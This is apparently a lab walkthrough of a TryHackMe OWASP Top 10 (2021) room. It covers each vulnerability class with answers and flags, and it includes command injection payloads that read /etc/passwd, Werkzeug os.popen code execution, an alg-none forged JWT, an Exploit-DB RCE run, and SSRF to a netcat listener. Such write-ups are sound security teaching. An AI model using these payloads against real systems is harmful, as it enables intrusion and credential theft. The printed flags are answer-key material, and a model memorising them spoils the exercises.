# OWASP Top 10 (2021)

*Also in: Cyber Security 101 - section 8, room 5; Security Engineer - section 4, room 1; PenTest+ - section 4, room 2*

## [Task 1] Introduction

OWASP - the Open Worldwide Application Security Project - is a key group of folks who develop various resources for web application security. The OWASP Top Ten list is one of these, and it outlines the top ten vulnerabilities targeting web applications. This list is updated occasionally (with a new list expected to come out following an announcement in the first half of 2025). In this room, we'll see all of the top ten vulnerabilities listed, how they arise, and how we can exploit them as pentesters and ethical hackers.

The 2021 top ten list is as follows:
1. Broken Access Control
2. Cryptographic Failures
3. Injection
4. Insecure Design
5. Security Misconfiguration
6. Vulnerable and Outdated Components
7. Identification and Authentication Failures
8. Software and Data Integrity Failures
9. Security Logging and Monitoring Failures
10. Sever-Side Request Forgery, SSRF

This assumes no previous security knowledge in any of these topics. As you can tell, this is a very _very_ long room.

## [Task 2] Accessing Machines

You will need to have the attached VM open as you work through these tasks, as well as the AttackBox.

## [Task 3] 1. Broken Access Control

In websites, you'll typically have pages that regular users aren't meant to see. You wouldn't want regular users to be able to access a user management page, for instance. This vulnerability arises whenever a website visitor gets into pages they shouldn't be able to see, and can result in the ability to view sensitive information from other users and the ability to perform unauthorized actions.

In brief, if you have broken access control, an attacker can bypass authorization and do things they shouldn't be allowed to do.

One such vulnerability cropped up in YouTube back in 2019. Videos uploaded on YouTube can be marked as Private, thus allowing only the owner and other explicitly-mentioned accounts to watch the video. Through some work and investigating around Google Ads endpoints, someone was able to figure out how to extract each frame of a private YouTube video, one by one. It wasn't without limitations - you had to know the video ID, you didn't have audio, and the resolution was low - but it was there. It was reported to Google, who confirmed this was a broken access control vulnerability, and patched it. A monetary award was issued, and all is well in that particular feature.

The specific vulnerability discussed in the write-up on the vulnerability - Insecure Direct Object Reference (IDOR) - will be discussed in the next task. A much simpler version of it will be exploited.

## [Task 4] 1. Broken Access Control (IDOR Challenge)

A direct object reference (DOR) is an identifier that refers to specific objects in a server - files, users, accounts, etc. An insecure direct object reference (IDOR) occurs when you're able to access these objects without the proper authentication or authorization.

The example given in the room takes place within a banking website. After logging in to a bank account website, you might have an ID - e.g. `https://bank.thm/account?id=111111`. That refers to your account, and this particular page would ahve your bank details and such. The issue in this case is that we have access to this ID in the URL bar. If we were to change it to a different ID, we may well get access to a different account entirely if IDOR is present.

Do note: This is NOT an issue with the use of a direct object reference in and of itself! IDOR occurs when the web app does NOT properly check if the user owns the account, or has authorization to view whatever resource it is they intended to view. An attacker can get sensitive information from other users due to IDOR.

We can investigate this in the machine by going to `http://MACHINE_IP`. If we log in with `noot` and the password `test1234`, we'll land on a page that has a `note_id` in the URL. We can change this value to different numbers and see what we can find. Incrementing the value gives us some pretty humorous notes and a clue to go _backwards_. If we let `note_id=0`, we get the following:

![image](https://github.com/user-attachments/assets/a92d93a1-95d3-4137-9e66-6ba5d7daa171)

**[Task 4, Question 1] Look at other users' notes. What is the flag?** - `flag{fivefourthree}`

## [Task 5] 2. Cryptographic Failures

Cryptographic failures arise when a web app misuses (or simply doesn't use) a secure cryptographic algorithm to protect sensitiev information. Cryptography is needed to provide confidentiality at many levels.

Say you have a secure email application. You want to make sure that communications between you and the server are encrypted so a third party can't read the contents of your email (encrypting data in transit). You also want to make sure that the email provider can't read your emails (encrypting data at rest).

These vulnerabilities occur when web apps divulge sensitive data. Such data is often tied to customers directly/physically (e.g. giving names, dates of birth, and so on), but it can also include passwords and usernames getting leaked.

However, not all cryptographic failures need to result in a data breach/leak. Some failures may lead to other issues such as man-in-the-middle attacks, where an attacker intercepts communications between a client and a server via a device they can control. That said, cryptographic failures aren't always that technical - you can very well find sensitive information just _on_ the web server.

## [Task 6] 2. Cryptographic Failures (Supporting Material 1)

These tasks help provide context for the exercise coming up in a later task. Large amounts of data are typically stored in a database, and database engines typically make use of the Structured Query Language (SQL) for interaction, as discussed in the Cyber Security 101 SQL room.

Databases are typically ste up on dedicated servers that run a database service such as MySQL and MariaDB. Databases can also be stored as files, making them known as "flat-file" databases. This is easier than setting up a whole database server, and you may well see this in smaller web apps.

If a flat-file database is stored under the root directory of the website (thus making it accessible to anyone who connects to the site), then that would be a big issue: we could simply download and query it on our own machine and access to any sensitive data within.

The most common and simplest flat-file database format is an SQLite database, and these can be interacted with in many programming languages. There's even a client for interacting with these guys: `sqlite3`. It's installed on many Linux distributions by default.

If we download a database, we can access it by running `sqlite3 (DATABASE_NAME)`. From here, you can see a list of tables by running `.tables`. To get information about a given table, run `PRAGMA table_info(table_name);`. This lists off the columns, their data types, and some additioanl information. From there, you can run your usual SQL commands to retrieve data from the table.

## [Task 7] 2. Cryptographic Failures (Supporting Material 2)

Databases may contain password hashes, particularly if they're used for authentication. We discussed how to crack password hashes in a few rooms of the Cyber Security 101 path, but here's a brief recap.

There are various tools pre-installed on systems like Kali or the AttackBox that can be used to crack hashes of different types. You can also make use of websites like Crackstation to crack weak password hashes. The hashes used in this room are weak MD5 hashes, so Crackstation shouldn't run into any issue with them.

To use Crackstation, paste the password hash for a given user, then solve the Captcha. From there, you can click the Crack Hashes button, and Crackstation will do what it can with its massive wordlist.

In this room, if you run into a hash that isn't working well with Crackstation, you can assume it wasn't meant to be cracked.

## [Task 8] 2. Cryptographic Failures (Challenge)

Now we get to work! We can go to `http://MACHINE_IP:81/`. We need to look around for anything regarding the website's sensitive data. One common place to check is the source code of the webpage - the hint specifically calls out the `/login` page. Right-clicking the page, clicking View Page Source, and reading around gives us this interesting snippet:

![image](https://github.com/user-attachments/assets/6b0a537d-1c37-422e-8b82-ba14892269e9)

**[Task 8, Question 1] Have a look around the web app. The developer has left themselves a note indicating that there is sensitive data in a specific directory. WHat is the name of the mentioned directory?** - `/assets`

With this in mind, we navigate to `http://MACHINE_IP:81/assets`. The list of assets available to access include:

![image](https://github.com/user-attachments/assets/85cc0f43-fb6d-4bb6-a717-3941909008b0)

The `webapp.db` file - given that it has a `.db` extension - is a database file. We might have some sensitive data here worth checking out, so let's download it to our machine.

**[Task 8, Question 2] Navigate to the directory you found in question one. What file stands out as being likely to contain sensitive data?** - `webapp.db`

From this, we can open the file by running `sqlite3 webapp.db` in a terminal. Listing the tables tells us that there are two tables: `sessions` and `users`. We're primarily concerned with the `users` table, especially because it happens to store all of the relevant usernames and password hashes:

![image](https://github.com/user-attachments/assets/3d436d09-1efd-46b0-a687-b7e7a0ef8893)

Particularly interesting is the highlighted bit - that's the hash of the `admin` user!

**[Task 8, Question 3] Use the supporting material to access the sensitive data. What is the password hash of the `admin` user?** - `6eea9b7ef19179a06954edd0f6c05ceb`

Now we head over to Crackstation and paste the hash in. It manages to crack it!

![image](https://github.com/user-attachments/assets/25d7333d-a17a-4bc2-aa6f-ee2727277a8b)

**[Task 8, Question 4] Crack the hash. What is the admin's plaintext password?** - `qwertyuiop`

We're now able to log in to the web app. Going back to `http://MACHINE_IP:81/login` and typing in the username `admin` and password `qwertyuiop`, we are greeted with this:

![image](https://github.com/user-attachments/assets/ede2de7c-2867-4b00-b223-9026376449bb)

**[Task 8, Question 5] Log in as the admin. What is the flag?** - `THM{Yzc2YjdkMjE5N2VjMzNhOTE3NjdiMjdl}`

## [Task 9] 3. Injection

Injection flaws are a common vulnerability in web apps today. The app may interpret user-controlled input (e.g. parameters, commands). Injection attacks depend on what's being used and how these technologies interpret input.

Common injection attack types include:
- SQL injection, which happens when a user passes input into SQL queries that manipulate the outcome of said queries. This can let an attacker see, modify, and delete information in a database.
- Command injection, which occurs when input is passed to system commands. This would let a user execute arbitrary system commands on app servers, perhaps allowing access into other systems.

Your main defense against injection is to make sure that user-controlled input is not interpreted as queries or commands. We call this _input validation_.
- Using an Allow List: You can compare the input sent into the server against a list of safe inputs and characters. If the input is safe, then it is processed; otherwise, it is not, and the application throws an error.
- Stripping input: If an input contains dangerous characters, then they are removed before processing begins. Dangerous characters/input are those that can change how the underlying data is processed.

There are utilities and libraries out there that can handle allow-list construction or input stripping for you.

## [Task 10] 3.1 Command Injection

We'll dive more into command injection (since we spent the previous vulnerability covering databases). Server-side code, such as those developed with PHP, may call a function that interacts with the server's console directly. This may let an attacker execute operating system commands arbitrarily on the server, which is _very bad_.

Here's some example code that we'll be exploiting in this task:

```php
<?php
  if (isset($_GET["mooing"])) {
    $mooing = $_GET["mooing"];
    $cow = 'default';

    if(isset($_GET["cow"]))
      $cow = $_GET["cow"];

    passthru("perl /usr/bin/cowsay -f $cow $mooing"); // uh-oh
  }
?>
```

This particular snippet checks to see if the `mooing` parameter is set. If it is, then the `$mooing` variable gets what was passed into the input field. If the `cow` parameter is set, then the `$cow` variable gets what was passed through the parameter. Then the program executes the `passthru()` function, which is going to be where the issues really start.

The `passthru()` command executes a command in the OS console and sends the output back to the browser. In this case, we're concatenating the `$cow` and `$mooing` variables at the end, and then having it ran through `cowsay`. This is a legitimate program that displays text in a nice little ASCII drawing of a cow. `$cow` will be used to specify how the ASCII art is drawn; our main focus will be what's going on in the `$mooing` variable. There's more documentation on this in PHP's website, but we can make use of the fact this is doing some stuff in the OS to do some nefarious things.

Bash has a feature known as _inline commands_, which allow you to execute commands within commands. This has legitimate uses, but here we'll be using it to inject a command into the `cowsay` server. To execute inline commands, you simply type `$(your_command)` into the command line. The command executes, and then the results will be used in whatever the outer command was. For instance, if we wrote `echo "my username is $(whoami)`, then `whoami` will return your username, and then the `echo` command will include your username.

So, our method of attack here: we send inline commands to the web application and see how it responds. The application accepts any input from us, so we can do all sorts of things.

This task will make use of the web app on `http://MACHINE_IP:82/`. To see what's in the website's root directory, we can type `$(ls -la)` into the moo prompt and see what we get:

![image](https://github.com/user-attachments/assets/71324895-0d34-4978-8e63-18c07c8b042f)

It's not the prettiest-looking output, but we can still get an idea of what's in there. We have two files in here: `index.php` and `drpepper.txt`. A little strange to see that latter file in the website's root directory.

**[Task 10, Question 1] What strange text file is in the website's root directory?** - `drpepper.txt`

For this next question, we want to find users with IDs of 1000 or greater. The best way to see a list of users and their IDs is to run `$(cat /etc/passwd)`. The screenshot below is truncated (it is otherwise quite large), but there are no users who are working with IDs larger than 1000. Note that `nobody` is a default account, even though its user ID is quite large.

![image](https://github.com/user-attachments/assets/b3ff109c-9050-4bb3-8b58-03e18041196a)

**[Task 10, Question 2] How many non-root/non-service/non-daemon users are there?** - 0

To see what this app is running as, we can just run `$(whoami)`.

![image](https://github.com/user-attachments/assets/42db7333-5896-47a7-8e03-2c52fee7c09e)

**[Task 10, Question 3] What user is this app running as?** - `apache`

Running the `$(cat /etc/passwd)` command again and scrolling through to the `apache` output (you can CTRL + F for it if you'd like), we see information about what shell it's using. It comes after the `/var/www` part of the string.

![image](https://github.com/user-attachments/assets/895ea95d-3c41-4233-b89f-58ef3602b98d)

**[Task 10, Question 4] What is the user's shell set as?** - `/sbin/nologin`

This last question is asking us about the version of Alpine Linux that is in use. Alpine Linux stores its information in `/etc/alpine-release`, so we can run `$(cat /etc/alpine-release)` to get the version number.

![image](https://github.com/user-attachments/assets/61b78aaa-6be8-498d-8366-9a3b81774a90)

**[Task 10, Question 5] What version of Alpine Linux is running?** - 3.16.0

## [Task 11] 4. Insecure Design

_Insecure design_ is simply those vulnerabilites that are inherent in how the application was built, i.e. its architecture. These aren't vulnerabilities in bad implementations or configurations, but rather these are vulnerabilities in how the application was _fundamentally conceptualized/designed_. These can occur as a result of poor threat modeling in the planning phase, or as a result of developers adding "shortcuts" around the code to make their testing easier. Developers may accidentally disable one-time passcode (OTP) validaiton in development to quickly test the app without logging in, and then forget to re-enable it when sending the app off to production.

Such a vulnerability was present in Instagram for a little while. Users were allowed to reset their forgotten passwords by sending a 6-digit code to their mobile number via SMS for validation. The attacker could try to brute-force this code, though Instagram blocked the user from trying after 250 attempts (which is a good thing!).

The problem is that the rate-limiting applied _only to attempts made from the same IP_. It is far too easy to get a bunch of IP addresses together and test all of the possibilities. With a six-digit code, you have 10^6 = 1,000,000 possible codes. With 250 codes per IP, you need 1,000,000 / 250 = 4,000 IP addresses. It's pretty easy to get ahold of this number of IPs, as large as that number seems.

The idea that led to this vulnerability in the first place was that no user would be able to use that many IPs to make that many requests to brute-force a numeric code. This is a vulnerability in how the application was _designed_ (i.e., the mindset behind the functionality). The implementation - the use of rate-limiting in OTPs - was fine.

Insecure design is introduced at early stages in development; resolving them typically requires rebuilding the applicaiton around the poor design choice. This is harder to do than fixing other code-related vulnerabilities. This is why folks suggest that you perform threat modeling at the early stages of development - develop with security in mind from the very beginning, so you don't have to fix big mistakes like these later. There are rooms on TryHackMe on secure development processes.

This exercise will take place on `http://MACHINE_IP:85/`. Our goal is to get into `joseph`'s account. We might first try to reset the password. Their main way of handling password resets (1) to have us enter the username, which we already know, and (2) to have us answer a security question. The issue here is one of the questions being "What's your favorite colour?"

![image](https://github.com/user-attachments/assets/68133c9f-ca32-402c-9cb3-fb4a4df87c12)

Security questions ideally have answers that only the account holder would know; it should be hard to figure them out. It's pretty easy to guess the answer to this question, since people would usually choose the same few colors. In this case, it's green. We give that as our answer, get a new password to log in with, and we're in `joseph`'s account. When we go to the Private tab and check out the `Flag.txt` file, we get

![image](https://github.com/user-attachments/assets/16163460-7201-4b0c-b279-de192c0b4c76)

**[Task 11, Question 1] What is the value of the flag in `joseph`'s account?** - `THM{Not_3ven_c4tz_c0uld_sav3_U!}`

## [Task 12] 5. Security Misconfiguration

Security misconfigurations occur when security could have been appropriately configured, but was not. This may include:
- Not having software up-to-date
- Having permissions poorly configured for cloud services
- Maintaining default accounts with unchanged passwords
- Displaying overly-detailed error messages, providing information to an attacker
- Not using HTTP security headers

These vulnerabilities often lead to more issues: for instance, with default credentials you might have sensitive data leakage, or you might be able to perform command injection in an admin page.

One common misconfiguration occurs when debugging features are exposed in production software. These give developers advanced functionality that can help with debugging an app. Attackers can abuse some of these functionalities if the developers forgot to disable them.

This happened in 2015 with Patreon. A researcher reported to Patreon that he found an open debug interface for a Werkzeug console, which is a vital component to Python-based web apps. This lets web servers execute Python code. Werkzeug has a debug console that can be accessed via a URL with `/console`, or it'll be presented to the user if an exception is raised by an app. This effectively leads to arbitrary code execution.

The website with this vulnerability can be accessed at `http://MACHINE_IP:86/`. We can get to the console by just going to `http://MACHINE_IP:86/console`. We can run the command given in the task to list off the contents of the current directory:

![image](https://github.com/user-attachments/assets/7ac2136a-1fdd-4add-88ba-fe3d128eeb7f)

**[Task 12, Question 1] Use the Werkzeug console to run the following Python code to execute the `ls -l` command on the server: `import os; print(os.popen("ls -l").read())`. What is the database file name (the one with the `.db` extension) in the current directory?** - `todo.db`

If we replace the `ls -l` string above with `cat app.py`, we get the contents of this file which include a flag:

![image](https://github.com/user-attachments/assets/e66bc9c0-b3b4-4299-906c-409180c26637)

**[Task 12, Question 2] Modify the code to read the contents of the `app.py` file, which contains the application's source code. What is the value of the `secret_flag` variable in the source code?** - `THM{Just_a_tiny_misconfiguration}`

## [Task 13] 6. Vulnerable and Outdated Compoents

A company or entity may be using a program with a well-known vulnerability; this may be the case with folks who are using outdated versions of components. If a company is using WordPress, you can figure out what version it's using by running WPScan. Certain versions of WordPress (e.g., 4.6) are vulnerable to unauthenticated remote code execution/RCE - meaning you can arbitrarily execute commands on a machine without needing to log in anywhere.

Folks will often post exploit code to places like Exploit-DB. An attacker wouldn't need to do much to exploit the vulnerability in the application. This becomes a huge issue when you realize that it just takes one outdated component to make the whole application vulnerable.

## [Task 14] 6. Vulnerable and Outdated Components - Exploit

If you're looking for components that are vulnerable and outdated, your main job will be to identify the software version and research it for exploits. Say a web app is running Nostromo 1.9.6 - you were able to figure it out by going to the web server's default page. You can check Exploit-DB for an exploit.

As it would turn out, there is an exploit script that we can use to get RCE. Note that we may need to adjust the script we download for it to work - one such script from Exploit-DB requires us to comment out a specific line. Once we do this, we run the script, following any instructions provided to make it work against the target. Most scripts will tell you what arguments you need to provide; you will rarely have to read through the entire script.

This process isn't always easy - you may have to do some digging around or guessing to figure out what kind of version a component is on. If there's a known vulnerability, though, you can probably figure out what version the app is running.

## [Task 15] 6. Vulnerable and Outdated Components - Lab

So, let's try exploiting something. The website at `http://MACHINE_IP:84/` is a bookstore application. We see at the bottom left of this page that this is the _projectworlds_ bookstore:

![image](https://github.com/user-attachments/assets/69e87dc6-7489-441f-aeb9-15111b610641)

We'll need to do some research to find some vulnerabilities. If we look for a projectworlds online bookstore RCE, we get some results from Exploit-DB:

![image](https://github.com/user-attachments/assets/d8550443-c4da-442d-9719-587159ea9820)

We download the file from Exploit-DB and attempt to run it. It tells us we need to provide the URL, so we do so and we get access to the server. From there, we can run `cat /opt/flag.txt` to see the contents of that file:

![image](https://github.com/user-attachments/assets/93f9847a-f0f0-43ca-bd75-414ede23611e)

**[Task 15, Question 1] What is the content of the `/opt/flag.txt` file?** - `THM{But_1ts_n0t_my_f4ult!}`

## [Task 16] 7. Identification and Authentication Failures

Authentication and sesion management are major components of modern web apps. Authentication lets users get access to web apps by verifying identities. The most common method of doing this is by using a username-password combination; a user enters these credentials, and the server verifies them.

If the credentials are correct, then the user's browser gets a session cookie. Cookies are needed for communication, since web servers typically communicate over the stateless HTTP(S) protocol. Cookies let the browser know who it is that's sending data.

If an attacker can find a flaw in authentication, then they may be able to get into other user accounts, letting the attacker potentially access sensitive daata. Some flaws may include:
- Brute-force: If a web app uses usernames and passwords, an attacker might be able to perform brute-force attacks.
- Weak password policies: If a user sets weak passwords, then they can be easily guessed, letting other people get into their accounts.
- Weak cookies: If session cookies contain predictable values, attackers can set their own cookies and access accounts.

Mitigations exist for poor authentication:
- Use a strong password policy to avoid password-guessing attacks
- Ensure that an applicaiton enforces an automatic lockout after a certain number of attempts. This can help slow down brute-force attacks.
- Use multifactor authentication. Requiring multiple methods to authenticate will make it more difficult for someone to get in someone else's account.

## [Task 17] 7. Identification and Authentication Failures Practical

Developers may forget to sanitize the username/password given by the user in their application's code, which can lead to vulnerabilities such as injection. There are other vulnerabilities that may arise from developer oversight - logic flaws. A logic flaw in an authentication mechanism would be the ability to re-register a user.

If we know there's an existing `admin` user and we want access in their account, we can try to re-register that username but with a slight modification. For instance, we might try to register as ` admin` (space included at the start). When we enter this username and the other required information and register, the web app might register a new user with the same rights as the actual `admin` acccount. That's problematic!

We can demonstrate this by going into `http://MACHINE_IP:8088/`. We'll try to log in with `darren` first with this trick. The username `darren` already exists so we'll want to try and log in with ` darren`. We can set the other fields to whatever we want; when we register, we should be able to log in to `darren`'s account. This yields the flag:

![image](https://github.com/user-attachments/assets/305ca17e-cb18-4ad1-a581-7814f354f627)

**[Task 17, Question 1] What is the flag that you found in `darren`'s account?** - `fe86079416a21a3c99937fea8874b667`

We can do the same thing with `arthur`'s account to get his flag:

![image](https://github.com/user-attachments/assets/dd64b604-f388-41f0-a88c-b9a4aba7efc7)

**[Task 17, Question 2] What is the flag that you found in `arthur`'s account?** - `d9ac0f7db4fda460ac3edeb75d75e16e`

## [Task 18] 8. Software and Data Integrity Failures

_Integrity_ refers to the idea that we don't want data to be modified. Important data should be kept free from accidental or malicious modification. To overcome this problem, we may have a hash sent with the file so we can prove that the file's integrity has been maintained. We've discussed this in the Cyber Security 101 room, but a hash/digst is essentially a unique identifier for a piece of data that is generated by some algorithm like MD5, SHA1, SHA256, etc.

Setup files will typically have hashes published with them. These are precalculated by the folks who put the installer up so that you can verify the file's integrity after downloading it. To verify the hashes, you can simply run `md5sum`, `sha1sum`, `sha256sum`, and commands like that in Linux. The hashes you get from these commands should be the same as the ones the developers put up. If they are, then you can be pretty confident that these files have not been changed.

A failure in software/data integrity means that software/data was used without performing integrity checks. This may allow an attacker to modify software/data passed to the application, which can result in unexpected consequences.

## [Task 19] 8. Software Integrity Failures

Often you'll make use of third-party libraries that are stored in external servers out of your control, as odd as this may be. For instance, `jQuery` is a commonly-used JavaScript library that can b e used directly from their servers - you don't have to download it! All you need are the tags `<script src="https://code.jquery.com/jquery-3.6.1.min.js"></script>`.

When a user goes to the website with these tags, its browser will read the HTML code and download jQuery from the specified source.

A very convenient feature, certainly. The issue is that if someone were able to hack the official repository, they could change the contents of the script file to inject malicious code. Thus everyone who accessed the page with that script tag would pull the malicious code and execute it unknowingly. This is a case of a _software integrity failure_, in which the browser makes no checks against the third-party library to see if it has changed.

The solution is pretty simple. Browsers let you specify hashes along with the library's URL so the library code is executed only if the hash of the downloaded file matches the expected value. This is a feature called _subroutine integrity_ (SRI). To correctly insert the library with SRI, you'd use `<script src="https://code.jquery.com/jquery-3.6.1.min.js" integrity="sha256-o88AwQnZB+VDvE9tvIXrMQaPlFFSUTR+nldQm1LuPXQ=" crossorigin="anonymous"></script>`.

To generate hashes for a library, you can visit srihash.org. In fact, we'll do that with another jQuery file. If we grab the link to jQuery 1.12.4 (as shown in the question below) and paste it into the hash generator, we get this:

![image](https://github.com/user-attachments/assets/25f8624d-1ab8-4164-9255-9d7045377e9b)

The hash is the string in quotes that starts with `sha256-`.

**[Task 19, Question 1] What is the SHA-256 hash of `https://code.jquery.com/jquery-1.12.4.min.js`?** - `sha256-ZosEbRLbNQzLpnKIkEdrPv7lOy9C27hHQ+Xp8a4MxAQ=`

## [Task 20] 8. Data Integrity Failures

Now we'll focus on the other main type of integrity failure: _data integrity failures_. We'll use session cookies as an example.

When a user logs into an app, they will be assigned a session token that will need to be saved on the browser for as long as the session lasts. This token is repeated in each subsequent request so the web app knows who we are. Typically they are assigned with _cookies_ - key-value pairs that a web app stores on the user's browser. This will be automatically repeated on each request to the website that issued them.

In a web email application, you may assign a cookie to each user after logging in that contains their username. Your browser would then always send the username in the cookie so the web app knows who is connecting. This is not good security practice; cookies are stored on the browser, so the user could potentially tamper with the cookie, change the username to someone else's, and read their emails. The failure in this case is that the web app is trusting data that an attacker can tamper with.

A solution to this problem would be to use an integrity mechanism to guarantee that the cookie has not been altered by the user. Token implementations exist that do this, plus deal with all the cryptography stuff for you. One such implementation is the JSON Web Token (JWT).

JWTs store key-value pairs on a token that provides integrity as a part of the token. Users ideally can't alter the key-value pairs such that they can pass the integrity check. A JWT token is comprised of a header, a payload, and a signature, each split off by a period (`.`).

The header contains metadata indicating a JWT is used, as well as what signing algorithm is used. The payload contains the key-value pairs with the data that the web app wants the client to store. The signature is like a hash, which is taken to verify the payload's integrity. If the payload changes, the web app can verify that the signature won't match the payload; thus it knows you messed with the JWT. This signature involves the use of a secret key held by the server only.

Each part of the JWT is plaintext encoded with base64, so it's possible to decode each section. Decoding the payload doesn't do much since it's binary data, but the rest will give you information about what's in the JWT.

Some libraries that implemented JWTs were found to have a data integrity failure in them. These libraries let attackers bypass the signature validation by doing the following:
1. Modifying the header of the token so the `alg` header would be set to `none`.
2. Removing the signature part.

Effectively, you can do these two steps, and then alter the contents of the payload so that you can gain access to things you shouldn't be able to. You need to decode the header and payload, clearly, but you can decode them back once you've made the necessary changes. Note that the ending period is kept, even after the signature is removed.

We can demonstrate this in `http://MACHINE_IP:8089/`. Attempting to log in with incorrect credentials gives us a heads up about how we can log in as a guest:

![image](https://github.com/user-attachments/assets/bc1613d5-17a6-435d-b133-6679950df74a)

**[Task 20, Question 1] Try logging into the application as `guest`. What is `guest`'s account password?** - `guest`

So, we can go ahead and log in with those credenitals. This gives us a JWT cookie in the browser. We can see the cookies by opening up developer tools (F12) and checking the Storage/Application sections, depending on what browser you're using. Here's what cookies we have:

![image](https://github.com/user-attachments/assets/9d7be1d2-a02e-4510-b747-3863bec79555)

**[Task 20, Question 2] What is the name of the website's cookie containing a JWT token?** - `jwt-session`

And from there, we can exploit the data integrity failure. We remove the signature (everything after the last period only), decode what's left over, edit the plaintext (set the "alg" value to "none" and change the username to "admin"), and then we encode it back to base64 and paste it in. Something like this will do:

![image](https://github.com/user-attachments/assets/e03d816e-c3a9-4593-9db5-b513eec27882)

Note that we encoded each line separately - each section of the JWT is its own set of base64-encoded text. In constructing our final cookie we need to combine these together with the appropriate periods: `eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0=.
eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxNjc4MzU4MzA5fQ==.`

When we use this as our cookie and refresh, we should have access to the admin account's flag:

![image](https://github.com/user-attachments/assets/de5e3c27-4926-40dc-83d0-bead7a48d478)

**[Task 20, Question 3] What is the flag presented to the `admin` user?** - `THM{Dont_take_cookies_from_strangers}`

## [Task 21] 9. Security Logging and Monitoring Failures

Actions performed by users on a web app need to be logged; otherwise, you'll have no idea what happened in a security incident, including what actions an attacker took. This can lead to bigger issues for an organization:
- Regulatory damage: If an attacker got into personally identifiable information and there's no record of this happening, then when it comes out that users were affected, the app owners may find themselves faced with fines or worse.
- Risk of further attacks: An attacker's presence may go undetected, allowing them to attack the web application further.

Information stored in logs includes the following:
- HTTP status codes
- Time stamps
- Usernamnes
- API endpoints, page locations
- IP addresses

These logs can have sensitive information, so they need to be stored securely and that many copies of these logs are stored at different locations.

Logging becomes particularly important after a breach or incident takes place. Ideally, you'd have it in place to detect suspicious activity, with the goal being to stop the attacker completely or to reduce whatever impact they can make once their presence has been detected.

Suspicious activity may include:
- Many unauthorized attempts for a particular action - usually authentication attempts or access to unauthorized resources
- Requests from suspicious IP addresses or locations, which can be indicative of someone else trying to access an account (but not always)
- Use of automated tools, which can be found by looking at User-Agent headers and request speed
- Common payloads, which can be used to determine if someone is conducting unauthorized or malicious testing on apps.

Suspicious activity must also be classified depending on how much of an impact it has, so folks can prioritize what needs to be dealt with in an incident.

A sample log file is provided in the task for us to examine. In it, we see that one IP has been trying to get into a series of different accounts.

![image](https://github.com/user-attachments/assets/ffd86154-aa34-4a48-bb06-acc21b66fd9b)

**[Task 21, Question 1] What IP address is the attacker using?** - `49.99.13.16`

This is what we might call a _brute force_ attack. Without logging, we wouldn't be able to easily tell something like this was happening!

**[Task 21, Question 2] What kind of attack is being carried out?** - Brute Force

## [Task 22] 10. Server-Side Request Forgery (SSRF)

This final type of vulnerability occurs when an attacker can coerce a web app into sending requests on their behalf to arbitrary destinations while being able to control the contents of the request itself. This arises when a web app needs to use third-party services.

If a web app uses an external API to send SMS notifications to clients, then this could be an issue. The website may need to make a web request to the SMS provider's server to send the content of the message to be sent. They may require a pre-assigned secret key for each request made to the API, since SMS messages can cost money to send. The API key is an authentication token and lets the provider know whom to bill each message to.

In the example provided by the room, a _server_ parameter is exposed to users. This defines the server name of the SMS service provider. They could change this so that it points to a machine they control, and all SMS messages would be forwarded to the attacker instead of the provider. The attacker would then get the API key, letting them use the SMS message to send messages in the owner's name, making the provider charge them.

All an attacker would have to do is make a request with `/sms?server=(ATTACKING_MACHINE)&msg=(MESSAGE)`. The person in the attacking machine could just capture the contents of the request with a tool like `netcat`.

SSRF can be used to do some damaging things:
- Enumeration of internal networks, IP addresses, ports
- Abuse of trust relationships between servers; ability to access restricted services
- Interaction with non-HTTP services to achieve RCE

We'll work through a practical example at `http://MACHINE_IP:8087/`. Our goal is to get to the admin area. The admin area is located at `http://MACHINE_IP:8087/admin`, but you'll notice that we're only allowed to get to it from `localhost`:

![image](https://github.com/user-attachments/assets/f5e21dc9-6270-40ed-a20d-f795497ec58d)

**[Task 22, Question 1] Explore the website. What is the only host allowed to access the admin area?** - `localhost`

Instead, let's look around for another awy in. We might be able to get in by using the Download Resume button. It seems to have a `server` parameter that points to `secure-file-storage.com`:

![image](https://github.com/user-attachments/assets/81aea365-4f8d-41aa-a8f9-515c360f6fca)

**[Task 22, Question 2] Check the "Download Resume button. Where does the server parameter point to?** - `secure-file-storage.com`

We can try to replace the `server` parameter with our attacking IP. All we have to do is open a netcat listener on our end (e.g. `nc -lvp 8080`), and change the URL's parameters such that `server=(MACHINE_IP):8080&id=(ID)`. Doing so, and navigating to the new link, gives us the following in `netcat`:

![image](https://github.com/user-attachments/assets/a02c7662-a424-4be3-a973-fdebb12f2265)

**[Task 22, Question 3] Using SSRF, make the application send the request to your AttackBox instead of the secure file storage. Are there any API keys in the intercepted request?** - `THM{Hello_Im_just_an_API_key}`

It's possible to use SSRF to get into the admin page, if we really wanted to go that far! You'll need to have the link formatted/encoded in a very particular way, but we can change the server so that it points to the `localhost` machine and gets pointed directly to the admin page. It'll look something like this:

![image](https://github.com/user-attachments/assets/3d4d90f6-d985-481e-bf54-d45f206bd92a)

Here's what the admin page looks like, incidentally:

![image](https://github.com/user-attachments/assets/699c7663-b5db-4fe0-9fbe-07e83f312094)

## [Task 23] What Next?

And that does it. That's all ten vulnerabilities covered in the 2021 Top Ten! This was a pretty extensive introduction to the kinds of attacks we need to keep in mind when it comes to web apps. There's still plenty to learn, and there's even entire pathways dedicated to learning web attacks.

In the Cyber Security 101 module, this represents the end of the Web Hacking section. Next is the Offensive Security Tooling section, which will cover a handful of tools that are used in offensive security testing engagements.
